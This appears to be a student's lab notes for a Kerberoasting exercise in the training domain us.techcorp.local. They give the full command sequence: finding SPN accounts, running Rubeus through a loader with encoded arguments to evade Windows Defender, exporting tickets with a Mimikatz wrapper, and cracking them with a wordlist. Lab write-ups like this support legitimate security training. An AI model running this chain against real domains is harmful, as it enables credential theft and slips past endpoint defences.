
Task 

• Using the Kerberoast attack, get the clear-text password for an account in us.techcorp.local domain.

We first need to find out services running with user accounts as the services running with machine accounts have difficult passwords. We can use PowerView’s (Get-DomainUser –SPN) or ActiveDirectory module for discovering such services. Using ActiveDirectory module:

```
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} - Properties ServicePrincipalName
```

Please note that it is not necessary to have an actual service using 'serviceaccount'. For the DC, an account with SPN set is a service account.


We can use Rubeus to get hashes for the serviceaccount. Note that we are using the /rc4opsec option that gets hashes only for the accounts that support RC4. This means that if ' This account supports Kerberos AES 128/256 bit encryption' is set for a service account, the below command will not request its hashes. Note that Windows Defender would detect Rubeus execution even when used with Loader. To avoid that, let’s pass encoded arguments to the Loader. First, run the below command on the student VM to generate encoded arguments for "kerberoast"


```
C:\AD\Tools\ArgSplit.bat
```


```
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:serviceaccount /simple /rc4opsec /outfile:C:\AD\Tools\hashes.txt
```

we can decrypt it with john

We can also use the KerberosRequestorSecurityToken .NET class from PowerShell to request a ticket. Now, let’s request a ticket for the serviceaccount user:


```
Add-Type -AssemblyName System.IdentityModel
```

used to load the **System.IdentityModel** assembly, which is part of .NET and provides classes for working with identity and authentication (such as tokens, claims, and federation authentication

```
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "USSvc/serviceaccount"
```

Let's check if we got the ticket:

```
Klist
```

Now, let’s dump the tickets on disk:

```
. C:\AD\Tools\Invoke-Mimi.ps1
```

```
Invoke-Mimi -Command '"kerberos::list /export"'
```

Lets Brute force 

```
python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\2-60210000-studentuserx@USSvc~serviceaccount-US.TECHCORP.LOCAL.kirbi
```

using this

